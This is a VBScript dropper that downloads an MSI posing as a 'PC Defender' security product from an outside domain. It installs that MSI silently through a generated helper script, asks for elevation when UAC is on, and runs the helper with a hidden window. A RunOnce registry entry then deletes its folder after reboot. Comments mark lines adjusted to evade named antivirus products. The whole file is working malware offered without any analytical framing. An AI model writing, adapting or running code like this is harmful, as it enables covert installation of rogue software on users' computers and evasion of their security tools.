Dim objFSO, objFolder
strDirectory = "" & getMyDocumentsPath & "\" & rndStr ' <- NOD32
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFolder = objFSO.CreateFolder(strDirectory)

downloadLink = "http://kaksosatsite.info/PCDefenderSilentSetup.msi"
fileToDonwload = "" & rndStr & ".msi"
Download downloadLink, strDirectory, fileToDonwload ' <- KIS

runFileVbsContent = "Dim shell, strOS, strVerKey, strVersion, strUacKey, strUac" & vbCr & vbLf & _
    "Set Shell = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "strOS = shell.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If strOS = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   strVerKey = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   strVersion = Shell.regread(strVerKey & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  strVerKey = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  strVersion = Shell.regread(strVerKey & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "strVersion = Mid(strVersion,1,1)" & vbCr & vbLf & _
    "If (strVersion = 6) Then" & vbCr & vbLf & _
    "   strUacKey = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   strUac = Shell.regread(strUacKey & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set shell = Nothing" & vbCr & vbLf & _
    "Set shell = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((strVersion = 6) AND (strUac = 1)) Then" & vbCr & vbLf & _
	"   shell.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&fileToDonwload&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set shell = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   shell.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&fileToDonwload&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set shell = Nothing" & vbCr & vbLf & _
    "End If"
newVbsFileName = strDirectory & "\" & rndStr & ".vbs"
Set WriteStuff = objFSO.OpenTextFile(newVbsFileName, 8, True)
WriteStuff.WriteLine(runFileVbsContent)
WriteStuff.Close

dim objShell
set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "wscript", """" & newVbsFileName & """", "", "open", 0 ' <- McAfee
set objShell = nothing

deleteMsiAfterRestart strDirectory


Function Download(URL, Folder, Filename)
   Dim XMLHTTP, a__dDDD_o___strEam
   
   URL = Replace(URL,"\","/")

   'If len(FileName) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set XMLHTTP = CREATEOBJECT("Microsoft.XMLHTTP") 
   XMLHTTP.open "GET", URL, "False" 

   XMLHTTP.send 
   If XMLHTTP.statustext = "OK" Then 
      Set a__dDDD_o___strEam = CreateObject("ADODB.Stream") 
      a__dDDD_o___strEam.type = 1 
      a__dDDD_o___strEam.Open 
      a__dDDD_o___strEam.Write XMLHTTP.responseBody 

      if len(Folder) > 0 Then FileName = Folder & "\" & FileName 
      a__dDDD_o___strEam.SaveToFile FileName, 2 
      a__dDDD_o___strEam.Close 
      Set a__dDDD_o___strEam = Nothing 
      Download = 1
   End if 
   Set XMLHTTP = Nothing
End Function


Function rndStr
	intUpperLimit = 14
	intLowerLimit = 7

	Randomize  
	intCharacters = Int(((intUpperLimit - intLowerLimit + 1) * Rnd) _
	    + intUpperLimit)  

	intUpperLimit = 90
	intLowerLimit = 65
	
	For i = 1 to intCharacters
	    Randomize
	    intASCIIValue = Int(((intUpperLimit - intLowerLimit + 1) * Rnd) _
	        + intLowerLimit)  
	    strPassword = strPassword & Chr(intASCIIValue)
	Next
	
	rndStr = strPassword
End Function


Function getMyDocumentsPath
	Set WshShell = Wscript.CreateObject("Wscript.Shell")
	getMyDocumentsPath = WshShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function deleteMsiAfterRestart(path)
	Set WshShell = Wscript.CreateObject("Wscript.Shell")
	WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\delpcdefmsi", "cmd /c rmdir /s /q """ & path & """", "REG_SZ"
End Function
